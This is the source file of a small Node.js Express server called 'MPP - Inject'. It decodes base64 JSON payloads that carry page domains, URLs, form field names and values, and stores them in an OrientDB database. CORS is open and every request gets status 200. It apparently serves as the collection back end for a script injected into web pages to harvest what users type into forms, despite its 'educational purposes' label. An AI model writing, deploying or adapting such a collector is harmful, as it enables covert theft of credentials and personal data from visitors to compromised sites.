/*
 * MPP - Inject
 *
 * Copyright (c) 2018, Ivan Sostarko (ivan.sostarko at hotmail.com)
 *
 * Github (https://github.com/IvanSostarko/mpp-inject)
 *
 * This program is created only for educational purposes.
 *
 * Licensed under the MIT License.
 *
 */


// Include packages
var app = require('express')();
var bodyParser = require('body-parser');
var Oriento = require('oriento');
var cors = require('cors');
var base64 = require('base-64');
var dotenv = require('dotenv');

// Load ENV config
dotenv.load();

// Define Debug
var debug_app = process.env.DEBUG;

// Define App port
var port = process.env.APP_PORT;

// Define DB Server
var server = Oriento({
  host: process.env.DB_HOST,
  port: process.env.DB_PORT,
  username: process.env.DB_USER,
  password: process.env.DB_PASS
});


// Define Database
var db = server.use({
  name: process.env.DB_NAME,
  username: process.env.DB_USER,
  password: process.env.DB_PASS
});


app.use(bodyParser.json());
app.use(cors());
app.use(bodyParser.urlencoded({
	extended: true
}));


// Main API route
app.get('/', function (req, res) {

	// Decode values
	var req_payload = base64.decode(req.param('payload'));

	// Print Received Values
	if(debug_app) {console.log("Received values: " + req_payload);}

	// Encode
    var objectValue = JSON.parse(req_payload);

	// Get API Values
	var req_domain = objectValue['prmrs_domain'];
	var req_protocol = objectValue['prmrs_protocol'];
	var req_url = objectValue['prmrs_url'];
	var req_path = objectValue['prmrs_path'];
	var req_name = objectValue['prmrs_name'];
	var req_value = objectValue['prmrs_value'];
	var req_type = objectValue['prmrs_type'];

	// Print parsed values
	if(debug_app) {
		console.log("New request from dummy page:)");
		console.log("Domain: " + req_domain);
		console.log("Protocol: " + req_protocol);
		console.log("URL: " + req_url);
		console.log("Path: " + req_path);
		console.log("Name: " + req_name);
		console.log("Value: " + req_value);
		console.log("Type: " + req_type);
	}

	// Insert values in OrientDB
	db.insert().into(process.env.DB_SHEMA).set({domain: req_domain, protocol: req_protocol, url: req_url, path: req_path, name: req_name, value: req_value, type: req_type}).one()
	.then(function (mpp) {

		if(debug_app) { console.log('New record inserted', mpp); }
	});

	// Always return status code 200
	res.sendStatus(200);
});

app.listen(port, function() {
	console.log('Starting mpp-inject server on port ' + port);
});